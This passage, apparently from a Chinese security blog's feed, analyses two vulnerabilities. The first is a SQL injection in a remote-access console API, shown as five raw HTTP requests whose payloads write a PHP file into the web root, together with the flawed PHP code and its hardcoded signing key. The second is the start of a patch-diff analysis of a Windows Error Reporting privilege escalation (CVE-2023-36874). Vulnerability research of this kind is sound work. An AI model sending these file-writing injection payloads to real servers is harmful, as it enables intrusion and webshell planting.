style="display:flex;"><span><span style="color:#a6e22e">POST</span> /ConsoleExternalApi.XGI?initParams=command_editUser__userId_usr00000010&amp;key=inner&amp;sign=dd1d23cb85d99349f2ab003c73df331f<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">174</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>{"userGroupId":"aa","account":"aaa' union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\"&lt;?php phpinfo();?>\" into outfile \"../../WebRoot/1.php\";#"}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /ConsoleExternalApi.XGI?initParams=command_allocatedPointsToServer&amp;key=inner&amp;sign=a3efd6862f5d11319c6de783b58ff04a<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">142</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>{"serverId":"aa' union select 0,0,\"&lt;?php phpinfo();?>\" into outfile \"../../WebRoot/1.php\";#","pointNUm":"aaa","maximumConcurrentNUm":"aa"}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /ConsoleExternalApi.XGI?initParams=command_getServerIpPort&amp;key=inner&amp;sign=94c4e967c00cb6da510b6a5e4e3c3fcc<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">89</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>{"iP":"aa' union select 0,\"&lt;?php phpinfo();?>\" into outfile \"../../WebRoot/1.php\";#"}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /ConsoleExternalApi.XGI?initParams=command_publishApp&amp;key=inner&amp;sign=74ed1f0c20a444c561294b4939b206dc<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">100</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>{"name":"aa' union select \"&lt;?php phpinfo();?>\" into outfile \"../../WebRoot/1.php\";#","type":"a"}</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /ConsoleExternalApi.XGI?initParams=command_editApp__appId_APP00000002&amp;key=inner&amp;sign=f25574d747ffbbd51496015d25438fa9<span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span></span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span><span style="color:#ae81ff">no-cache</span></span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span><span style="color:#ae81ff">sqlmap/1.5.8#stable (http://sqlmap.org)</span></span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span><span style="color:#ae81ff">PHPSESSID=6mnhgqk6af1nmoqglg9sqfvek2;think_language=zh-cn</span></span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span><span style="color:#ae81ff">192.168.60.135</span></span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span><span style="color:#ae81ff">*/*</span></span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span><span style="color:#ae81ff">gzip, deflate</span></span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span><span style="color:#ae81ff">close</span></span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span><span style="color:#ae81ff">223</span></span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>{"name":"aa' union select 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\"&lt;?php phpinfo();?>\" into outfile \"../../WebRoot/1.php\";#"}</span></span></code></pre></div><p>代码逻辑：</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// 传入参数initParams key sign</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>$initparams<span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">'initParams'</span>];</span></span><span style="display:flex;"><span>$key<span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">'key'</span>];</span></span><span style="display:flex;"><span>$sign<span style="color:#f92672">=</span> $_REQUEST[<span style="color:#e6db74">'sign'</span>];</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 两个下划线分割$initparams，变成一个数组</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>$paramArr<span style="color:#f92672">=</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">"__"</span>, $initparams);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 设置key inner</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ($key<span style="color:#f92672">==</span><span style="color:#e6db74">"wusuokey"</span>) {</span></span><span style="display:flex;"><span> $keyVal<span style="color:#f92672">=</span> $COMCASWEB<span style="color:#f92672">-></span><span style="color:#a6e22e">getfarminfo</span>($key);</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span><span style="color:#66d9ef">if</span> ($key<span style="color:#f92672">==</span><span style="color:#e6db74">"inner"</span>) {</span></span><span style="display:flex;"><span> $keyVal<span style="color:#f92672">=</span><span style="color:#e6db74">"Realor"</span>;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($keyVal)<span style="color:#f92672">||</span><span style="color:#66d9ef">empty</span>($keyVal)) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_log</span>(<span style="color:#e6db74">"{'参数非法':'key值为空'}"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exitErrorJson</span>(<span style="color:#e6db74">'参数非法'</span>);</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>$signCalculate<span style="color:#f92672">=</span><span style="color:#a6e22e">md5</span>($initparams<span style="color:#f92672">.</span> $keyVal);</span></span><span style="display:flex;"><span><span style="color:#75715e">//testLog("signCalculate=" . $signCalculate);</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> ($signCalculate<span style="color:#f92672">!=</span> $sign) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_log</span>(<span style="color:#e6db74">"{'参数非法':'参数加密方法错误'}"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exitErrorJson</span>(<span style="color:#e6db74">'参数非法'</span>);</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span>$requestObj<span style="color:#f92672">=</span><span style="color:#66d9ef">null</span>;</span></span><span style="display:flex;"><span><span style="color:#75715e">//testLog($paramArr);</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span><span style="color:#75715e">// command_createuser</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 遍历数组，将数组的每一项通过_分割，变成键值对</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">foreach</span> ($paramArr<span style="color:#66d9ef">as</span> $key<span style="color:#f92672">=></span> $value) {</span></span><span style="display:flex;"><span> $keyValue<span style="color:#f92672">=</span><span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">"_"</span>, $value);</span></span><span style="display:flex;"><span> $requestObj[$keyValue[<span style="color:#ae81ff">0</span>]]<span style="color:#f92672">=</span> $keyValue[<span style="color:#ae81ff">1</span>];</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 获取command对应的值</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/>$cmd<span style="color:#f92672">=</span> $requestObj[<span style="color:#e6db74">'command'</span>];</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($cmd<span style="color:#f92672">==</span><span style="color:#e6db74">"createUser"</span>) {</span></span><span style="display:flex;"><span><span style="color:#75715e">// 从请求中获取json数据并decode</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> $POST_JSON<span style="color:#f92672">=</span><span style="color:#a6e22e">json_decode</span>($HTTP_RAW_POST_DATA,<span style="color:#66d9ef">true</span>);</span></span><span style="display:flex;"><span> $account<span style="color:#f92672">=</span> $POST_JSON[<span style="color:#e6db74">'account'</span>];</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 这里要保证请求的json数据里面有account</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($account)<span style="color:#f92672">||</span><span style="color:#66d9ef">empty</span>($account)) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_log</span>(<span style="color:#e6db74">"{'createUser':'用户账户不可为空'}"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exitErrorJson</span>(<span style="color:#e6db74">'用户账号不可为空'</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> $account<span style="color:#f92672">=</span><span style="color:#a6e22e">utf8ToGbk</span>($account);</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 这里要保证请求的json数据里面有userPwd</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> $userPwd<span style="color:#f92672">=</span> $POST_JSON[<span style="color:#e6db74">'userPwd'</span>];</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($userPwd)<span style="color:#f92672">||</span><span style="color:#66d9ef">empty</span>($userPwd)) {</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write_log</span>(<span style="color:#e6db74">"{'createUser':'用户密码不可为空'}"</span>);</span></span><span style="display:flex;"><span><span style="color:#a6e22e">exitErrorJson</span>(<span style="color:#e6db74">'用户密码不可为空'</span>);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span><span style="color:#75715e">//账号是否已存在 触发漏洞</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/> $result<span style="color:#f92672">=</span><span style="color:#a6e22e">mysql_query</span>(<span style="color:#e6db74">"select * from cuser where name='"</span><span style="color:#f92672">.</span> $account<span style="color:#f92672">.</span><span style="color:#e6db74">"'"</span>, $DSCon);</span></span></code></pre></div><p><strong>Created at 2023-09-20T10:04:31+08:00</strong></p></description></item><item><title>CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析</title><link>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</link><pubDate>Tue, 19 Sep 2023 10:26:14 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/</guid><description><h3 id="基本信息">基本信息</h3><p>Windows error resporting service中存在权限提升漏洞，当攻击者可以创建符号链接及目录时，可以利用这个漏洞提升至SYSTEM权限。</p><h3 id="影响版本">影响版本</h3><p>略</p><h3 id="环境搭建">环境搭建</h3><ul><li>Windows 10 21H2 6月补丁</li></ul><h3 id="技术分析调试">技术分析&amp;调试</h3><p><strong>补丁对比</strong>
diff wercplsupport.dll，主要改了CWerComReport::SubmitReport，wercplsupport.dll是Windows error reporting 服务的主dll文件。</p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230826175253.png"/></p><p>对比发现补丁直接阻断了后续<code>CAutoImpersonate::ImpersonateUserHighestPrivs</code>和<code>CWerComReport::_SubmitReport</code>的调用</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">//未修复</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CWerComReport<span style="color:#f92672">::</span><span style="color:#a6e22e">SubmitReport</span>(</span></span><span style="display:flex;"><span> CWerComReport<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> IWerReportSubmitCallback<span style="color:#f92672">*</span>a4,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">**</span>a5,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a6)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> v10;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v12;<span style="color:#75715e">// [rsp+30h] [rbp-18h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v13;<span style="color:#75715e">// [rsp+38h] [rbp-10h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>i64;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CAutoImpersonate<span style="color:#f92672">::</span>g_bEnableImpersonate</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v10<span style="color:#f92672">=</span> CAutoImpersonate<span style="color:#f92672">::</span><span style="color:#a6e22e">ImpersonateUserHighestPrivs</span>((CAutoImpersonate<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v12), v10<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v10<span style="color:#f92672">=</span> CWerComReport<span style="color:#f92672">::</span><span style="color:#a6e22e">_SubmitReport</span>((CWerComReport<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>), a2, a3, a4, a5, a6);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> CAutoImpersonate<span style="color:#f92672">::~</span><span style="color:#a6e22e">CAutoImpersonate</span>((CAutoImpersonate<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v12);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v10;</span></span><span style="display:flex;"><span>}</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#75715e">// 修复代码</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span><span style="color:#66d9ef">__fastcall</span> CWerComReport<span style="color:#f92672">::</span><span style="color:#a6e22e">SubmitReport</span>(</span></span><span style="display:flex;"><span> CWerComReport<span style="color:#f92672">*</span>this,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">*</span>a2,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span> a3,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> IWerReportSubmitCallback<span style="color:#f92672">*</span>a4,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int16</span><span style="color:#f92672">**</span>a5,</span></span><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span><span style="color:#f92672">*</span>a6)</span></span><span style="display:flex;"><span>{</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> v11;<span style="color:#75715e">// ebx</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">int</span> v12;<span style="color:#75715e">// [rsp+30h] [rbp-18h] BYREF</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/><span style="color:#66d9ef">__int64</span> v13;<span style="color:#75715e">// [rsp+38h] [rbp-10h]</span></span></span><span style="display:flex;"><span><span style="color:#75715e"/></span></span><span style="display:flex;"><span> v13<span style="color:#f92672">=</span><span style="color:#f92672">-</span><span style="color:#ae81ff">2</span>i64;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">__int8</span>)wil<span style="color:#f92672">::</span>details<span style="color:#f92672">::</span>FeatureImpl<span style="color:#f92672">&lt;</span>__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport<span style="color:#f92672">>::</span><span style="color:#a6e22e">__private_IsEnabled</span>(<span style="color:#f92672">&amp;</span><span style="color:#960050;background-color:#1e0010">`</span>wil<span style="color:#f92672">::</span>Feature<span style="color:#f92672">&lt;</span>__WilFeatureTraits_Feature_MSRC80633_DisableWerCplSupport<span style="color:#f92672">>::</span>GetImpl<span style="color:#960050;background-color:#1e0010">'</span><span style="color:#f92672">::</span><span style="color:#960050;background-color:#1e0010">`</span><span style="color:#ae81ff">2</span><span style="color:#960050;background-color:#1e0010">'</span><span style="color:#f92672">::</span>impl) )</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span><span style="color:#ae81ff">0x80004001</span>i64;</span></span><span style="display:flex;"><span> v12<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>;</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>CAutoImpersonate<span style="color:#f92672">::</span>g_bEnableImpersonate</span></span><span style="display:flex;"><span><span style="color:#f92672">||</span> (v11<span style="color:#f92672">=</span> CAutoImpersonate<span style="color:#f92672">::</span><span style="color:#a6e22e">ImpersonateUserHighestPrivs</span>((CAutoImpersonate<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v12), v11<span style="color:#f92672">>=</span><span style="color:#ae81ff">0</span>) )</span></span><span style="display:flex;"><span> {</span></span><span style="display:flex;"><span> v11<span style="color:#f92672">=</span> CWerComReport<span style="color:#f92672">::</span><span style="color:#a6e22e">_SubmitReport</span>((CWerComReport<span style="color:#f92672">*</span>)((<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)this<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>), a2, a3, a4, a5, a6);</span></span><span style="display:flex;"><span> }</span></span><span style="display:flex;"><span> CAutoImpersonate<span style="color:#f92672">::~</span><span style="color:#a6e22e">CAutoImpersonate</span>((CAutoImpersonate<span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v12);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">unsigned</span><span style="color:#66d9ef">int</span>)v11;</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>根据函数名<code>CAutoImpersonate::ImpersonateUserHighestPrivs</code>可知，该函数为模拟用户最高的权限并提交report</p><p><strong>动态调试</strong></p><p>开启<code>Problem Reports Control Panel Support</code>服务，对应路径为<code>C:\Windows\System32\svchost.exe -k netsvcs -p</code>。
使用oleviewdotnet查询<code>Problem Reports Control Panel Support</code>服务对应的ole信息</p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230826185534.png"/></p><p><img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230826185718.png"/></p><p>对应的COM接口的CLSID为</p><ul><li>CLSID: 0E9A7BB5-F699-4D66-8A47-B919F5B6A1DB</li><li>AppID: 136A0DC7-DF5C-4271-A2AC-15DF1A1323F2<img alt="" src="/images/vulnerability/CVE-2023-36874-windows-error-reporting-service-eop.zh-cn.assets/20230911181821.png"/>
查看这个COM的接口信息</li></ul><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">__declspec</span>(uuid(<span style="color:#e6db74">"6620c14b-70ae-4d4e-a4f6-91a7dcc582c2"</span>)) IErcLuaSupport :<span style="color:#66d9ef">public</span> IUnknown {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc3(<span style="color:#75715e">/* Stack Offset: 8 */</span> IWerStoreFactory<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">__declspec</span>(uuid(<span style="color:#e6db74">"4904c154-426f-4c88-8ec2-4543d18670f7"</span>)) IWerStoreFactory :<span style="color:#66d9ef">public</span> IUnknown {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc3(<span style="color:#75715e">/* Stack Offset: 8 */</span> IWerStore<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc4(<span style="color:#75715e">/* Stack Offset: 8 */</span> IWerStore<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">__declspec</span>(uuid(<span style="color:#e6db74">"1e3a0e4f-1412-444f-8a94-fc6a09cd4195"</span>)) IWerStore :<span style="color:#66d9ef">public</span> IUnknown {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc3();</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc4(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR<span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc5(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc6(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR p0,<span style="color:#75715e">/* Stack Offset: 16 */</span> IWerReport<span style="color:#f92672">**</span> p1);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc7(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR p0,<span style="color:#75715e">/* Stack Offset: 16 */</span> BSTR<span style="color:#f92672">*</span> p1);</span></span><span style="display:flex;"><span>};</span></span><span style="display:flex;"><span/></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span><span style="color:#a6e22e">__declspec</span>(uuid(<span style="color:#e6db74">"d01b8f28-0bd1-4652-a415-8229f5ee506c"</span>)) IWerReport :<span style="color:#66d9ef">public</span> IUnknown {</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span><span style="color:#f92672">:</span></span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc3(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc4(<span style="color:#75715e">/* Stack Offset: 8 */</span><span style="color:#66d9ef">int64_t</span><span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc5(<span style="color:#75715e">/* Stack Offset: 8 */</span> BSTR<span style="color:#f92672">*</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc6(<span style="color:#75715e">/* Stack Offset: 8 */</span> IWerKeyValueList<span style="color:#f92672">**</span> p0);</span></span><span style="display:flex;"><span><span style="color:#66d9ef">virtual</span> HRESULT<span style="color:#66d9ef">__stdcall</span> Proc7(<span style="color:#75715e">/* Stack Offset: 8 */</span> 